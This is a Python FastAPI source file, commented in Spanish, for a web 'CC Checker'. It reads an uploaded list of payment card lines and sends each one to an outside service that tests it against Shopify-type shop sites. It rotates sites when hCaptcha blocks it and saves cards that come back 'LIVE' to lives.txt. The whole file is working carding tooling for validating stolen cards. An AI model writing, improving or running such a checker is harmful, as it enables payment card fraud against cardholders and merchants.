from fastapi import FastAPI, File, UploadFile
from fastapi.responses import HTMLResponse
import random
import requests
import os
import asyncio

app = FastAPI(title="CC Checker Web")

# --- Cargar sitios ---
if not os.path.exists("sites.txt"):
    sites = ["https://paperbloom.com"]
else:
    with open("sites.txt", "r") as f:
        sites = [line.strip() for line in f if line.strip()]

# --- Función para chequear CC ---
def check_cc(cc_line, site):
    url = f"https://auto-shopify-6cz4.onrender.com/index.php?site={site}&cc={cc_line}"
    try:
        r = requests.get(url, timeout=20)
        if r.status_code != 200:
            return {"cc": cc_line, "status": f"HTTP_ERROR_{r.status_code}", "site": site}

        try:
            data = r.json()
        except:
            return {"cc": cc_line, "status": "INVALID_RESPONSE", "site": site}

        response = data.get("Response", "").upper()
        if "CARD_DECLINED" in response or "DEAD" in response:
            return {"cc": cc_line, "status": "DECLINED", "site": site}
        elif "LIVE" in response:
            with open("lives.txt", "a") as f:
                f.write(cc_line + "\n")
            return {"cc": cc_line, "status": "LIVE", "site": site}
        elif "HCAPTCHA" in response or "GENERIC_ERROR" in response or "CONNECTION_ABORTED" in response:
            return {"cc": cc_line, "status": response, "site": site, "retry": True}
        else:
            return {"cc": cc_line, "status": response, "site": site}
    except Exception as e:
        return {"cc": cc_line, "status": "ERROR", "message": str(e), "site": site, "retry": True}

# --- Página web para subir archivo ---
@app.get("/", response_class=HTMLResponse)
def upload_page():
    return """
    <html>
        <head><title>CC Checker</title></head>
        <body>
            <h2>Subir archivo ccs.txt</h2>
            <form action="/process" enctype="multipart/form-data" method="post">
                <input name="file" type="file" accept=".txt">
                <input type="submit" value="Procesar CCs">
            </form>
        </body>
    </html>
    """

# --- Endpoint para procesar archivo ---
@app.post("/process")
async def process_file(file: UploadFile = File(...)):
    if not file.filename.endswith(".txt"):
        return HTMLResponse("<h3>Solo se permiten archivos .txt</h3>")

    content = await file.read()
    lines = [line.strip() for line in content.decode().splitlines() if "|" in line]

    results = []
    for cc_line in lines:
        available_sites = sites.copy()
        random.shuffle(available_sites)
        processed = False
        for site in available_sites:
            result = check_cc(cc_line, site)
            if result.get("retry", False):
                continue  # intentar otro sitio si hay HCAPTCHA o error
            results.append(result)
            processed = True
            break
        if not processed:
            # Si todos los sitios dieron HCAPTCHA o error, marcar como NO_PROCESADO
            results.append({"cc": cc_line, "status": "NO_PROCESADO", "site": None})

    # Guardar solo aprobadas
    lives = [r for r in results if r["status"] == "LIVE"]

    html_result = "<h3>Proceso terminado</h3>"
    html_result += f"<p>Total CCs procesadas: {len(lines)}</p>"
    html_result += f"<p>Lives: {len(lives)}</p>"
    html_result += "<ul>"
    for r in results:
        html_result += f"<li>{r['cc']} - {r['status']} - {r['site']}</li>"
    html_result += "</ul>"
    return HTMLResponse(html_result)
